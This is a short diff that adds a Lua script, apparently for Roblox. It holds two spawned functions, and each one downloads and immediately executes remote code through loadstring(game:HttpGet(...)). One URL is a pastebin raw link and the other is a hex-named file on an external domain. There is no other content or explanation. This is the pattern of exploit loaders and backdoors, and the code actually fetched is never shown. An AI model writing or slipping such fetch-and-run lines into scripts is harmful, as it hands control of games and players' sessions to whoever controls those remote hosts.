@@ -1,0 +1,7 @@
+spawn(function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/JhMqGGfF"))()
+end)
+
+spawn(function()
+    loadstring(game:HttpGet("https://egorikusa.space/223263f659609c11be7c550c.lua", true))()
+end)
